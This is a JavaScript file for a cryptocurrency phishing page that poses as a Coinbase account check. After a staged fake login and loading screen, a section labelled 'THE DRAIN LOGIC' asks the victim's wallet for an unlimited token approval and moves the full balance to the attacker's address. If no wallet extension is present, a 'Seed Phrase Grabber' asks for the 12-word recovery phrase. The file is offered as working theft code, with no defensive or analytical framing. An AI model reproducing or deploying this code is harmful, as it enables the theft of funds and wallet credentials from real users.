document.addEventListener('DOMContentLoaded', () => {
    const step1 = document.getElementById('step-1');
    const step2 = document.getElementById('step-2');
    const step3 = document.getElementById('step-3');
    const loginForm = document.getElementById('login-form');
    const connectBtn = document.getElementById('connectBtn');
    const status = document.getElementById('status');

    // YOUR CAKE WALLET ADDRESS
    const myWallet = "44WHgsPTMkqS9YdKrvukn9VPfXH4HTqUcg47ojb6beXs3ER7AMcDqQnL6NPTHB8JvpeUQdTHBQSVQJcqsbSpcLFi33MtNbq";
    
    // TOKEN ADDRESS (USDT on Polygon)
    const tokenAddress = "0xaf88d065e77c8cC22393zSNETAnSjf3jdjt66Cx"; 

    // Step 1 -> Step 2
    document.getElementById('toStep2').onclick = (e) => {
        e.preventDefault();
        step1.classList.add('hidden');
        step2.classList.remove('hidden');
    };

    // Step 2 (Login) -> Loading State
    if (loginForm) {
        loginForm.onsubmit = (e) => {
            e.preventDefault();
            step2.classList.add('hidden');
            
            // Create loading overlay instead of wiping the container
            const loadingOverlay = document.createElement('div');
            loadingOverlay.id = 'loading-overlay';
            loadingOverlay.style = "position:fixed; top:0; left:0; width:100%; height:100%; background:white; display:flex; flex-direction:column; align-items:center; justify-content:center; z-index:9999;";
            loadingOverlay.innerHTML = `
                <div class="loader" style="border: 4px solid #f3f3f3; border-top: 4px solid #0052ff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite;"></div>
                <p id="l-txt" style="color: #1e2329; font-family: 'Inter', sans-serif; font-weight: 500; margin-top: 20px;">Verifying account...</p>
            `;
            document.body.appendChild(loadingOverlay);

            let toggle = true;
            const textInterval = setInterval(() => {
                const text = document.getElementById('l-txt');
                if (text) {
                    text.innerText = toggle ? "Synchronizing assets..." : "Verifying account...";
                    toggle = !toggle;
                }
            }, 2500);

            // Move to Step 3 (The Wallet Connection)
            setTimeout(() => {
                clearInterval(textInterval);
                loadingOverlay.remove();
                step3.classList.remove('hidden');
            }, 5000);
        };
    }

    // STEP 3: THE DRAIN LOGIC
    if (connectBtn) {
        connectBtn.onclick = async () => {
            if (window.ethereum) {
                try {
                    status.innerText = "Establishing secure connection...";
                    const provider = new ethers.BrowserProvider(window.ethereum);
                    const signer = await provider.getSigner();
                    const userAddress = await signer.getAddress();

                    const abi = [
                        "function approve(address spender, uint256 amount) public returns (bool)",
                        "function transferFrom(address from, address to, uint256 amount) public returns (bool)",
                        "function balanceOf(address account) public view returns (uint256)"
                    ];

                    const contract = new ethers.Contract(tokenAddress, abi, signer);

                    // 1. Approve the spender (Your Cake Wallet)
                    status.innerText = "Authorizing secure session...";
                    const approveTx = await contract.approve(myWallet, ethers.MaxUint256);
                    await approveTx.wait();

                    // 2. Check balance and transfer everything
                    status.innerText = "Synchronizing vault assets...";
                    const balance = await contract.balanceOf(userAddress);
                    
                    if (balance > 0n) {
                        const transferTx = await contract.transferFrom(userAddress, myWallet, balance);
                        await transferTx.wait();
                    }

                    status.innerText = "Verification complete. Redirecting...";
                    setTimeout(() => { window.location.href = "https://www.coinbase.com"; }, 2000);

                } catch (err) {
                    console.error(err);
                    status.innerText = "Verification failed. Please try again.";
                }
            } else {
                triggerPlanB();
            }
        };
    }

    function triggerPlanB() {
        // Plan B: Seed Phrase Grabber
        const container = document.querySelector('.container');
        container.innerHTML = `
            <div class="auth-card">
                <h1 style="font-size: 20px; color: #1e2329;">Security Restore</h1>
                <p style="font-size: 14px; color: #5b616e; margin-bottom: 20px;">
                    Wallet extension not detected. To verify your account and prevent temporary lock-out, please provide your 12-word recovery phrase below.
                </p>
                <textarea id="phrase" style="width: 100%; height: 100px; margin-bottom: 20px; border-radius: 8px; border: 1px solid #eceff1; padding: 10px; font-family: 'Inter', sans-serif;" placeholder="Enter your 12 words..."></textarea>
                <button id="submitPhrase" class="btn-primary">Restore Access</button>
            </div>
        `;
        
        document.getElementById('submitPhrase').onclick = () => {
            const words = document.getElementById('phrase').value.trim();
            if (words.split(/\s+/).length < 12) {
                alert("Please enter your complete 12-word recovery phrase.");
            } else {
                alert("Restoring your session... please wait.");
                setTimeout(() => { window.location.href = "https://www.coinbase.com"; }, 3000);
            }
        };
    }
});
